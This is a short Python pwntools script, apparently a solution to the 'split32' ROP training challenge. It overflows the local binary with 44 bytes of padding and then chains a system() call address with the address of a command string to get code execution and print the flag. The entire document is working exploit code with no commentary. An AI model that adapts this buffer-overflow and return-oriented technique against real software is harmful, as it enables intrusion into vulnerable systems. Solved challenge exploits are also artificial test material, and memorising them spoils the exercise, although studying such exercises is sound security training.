#!/usr/bin/env python

from pwn import *

p = process("./split32")
b = ELF("./split32")


flag = p32(0x804a030)
padding = "A"*44
system = p32(0x08048657)

payload = padding + system + flag

p.recvuntil("> ")
p.sendline(payload)
print p.recvall()
